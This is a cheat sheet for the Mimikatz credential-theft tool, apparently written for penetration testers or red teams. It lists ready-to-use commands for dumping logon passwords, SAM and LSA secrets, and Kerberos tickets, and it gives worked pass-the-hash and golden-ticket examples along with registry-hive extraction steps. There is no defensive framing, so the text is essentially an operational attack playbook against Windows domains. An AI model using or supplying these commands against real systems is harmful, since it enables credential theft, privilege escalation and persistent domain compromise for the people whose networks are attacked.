Mimikatz Cheat Sheet


General Usage
	modulename::commandname arguments
	log <filename> - enable logging to mimikatz.log or <filename>
	base64 - disable file writing and output to console files in base64
	type :: only for a list of known modules
	type a module without commandname for help e.g. crypto::
	type ! before modulename to get SYSTEM, e.g. !privilege::debug (cobalt strike version only or standalone this is for kernel commands)
Command Help
	privilege::debug - obtain DEBUG privileges
	sekurlsa::logonpasswords - obtain all logon passwords
	sekurlsa::pth - pass the hash module
	sekurlsa::tickets - Kerberos tickets
	sekurlsa::ekeys - Get keys (e.g. aes256)
	sekurlsa::kerberos - smartcard PIN's
	kerberos::ptt - pass the ticket
	kerberos::tgt - Shows TGT session information
	kerberos::list /export - export all tickets on host to files (for ptt)
	kerberos::purge - clear all tickets for session lsadump::sam - dump SAM
	lsadump::secrets - dump secrets
	lsadump::cache - dump MS-cache logons
	lsadump::lsa - LSA query tools
	token::whoami - show token
	token::list - show all tokens
	token::elevate - elevate to SYSTEM (! shortcut)
	token::revert - revert to original self
	ts::multirdp - patch TerminalServices to allow multi-user sessions (unstable)
Useful Modules
	process:: - process management
	event:: - event management
	service:: - service management
	net:: - net.exe
	misc:: - command exec, detours hooking, misc stuff.
	token::revert - revert to original self
	ts::multirdp - patch TerminalServices to allow multi-user sessions
Pass-The-Hash Example
	sekurlsa::pth /user:Administrator /domain:<Full domain> /NTLM:<NTLMhash> /run:<CMD to run> - optional for 2008r2 & above/aes128:key /aes256:key
	<CMD to run must be in " and additional arguments \">
Golden-Ticket Example
	kerberos::golden /domain:<full domain> /sid:<domain sid> /user:<username> /krbtgt:<NTLM hash krbtgt user>
	- Generates a "ticket.kirbi" file, valid for 10 years to access the account specified.
	Use with "kerberos::ptt <filename>
	If using beacon you must spawn a new beacon to make use of privileges.
	If using domain admin ticket you can validate with "dir \\pdc\C$" or similar.
LSA Dump Example
	lsadump::lsa /patch - patch LSA and dump hashes
	lsadump::lsa /inject /name:krbtgt - inject and dump LSA details
Volume Shadow Copy Example
	Get SYSTEM and SAM hives from host, either with
	
	reg save HKLM\SYSTEM SystemBkup.hiv
	reg save HKLM\SAM SamBkup.hiv
	
	or use vss-own.vbs to make a volume shadow copy and access:
	c:\windows\system32\SAM
	c:\windows\system32\SYSTEM
	
	lsadump::sam SystemBkup.hiv SamBkup.hiv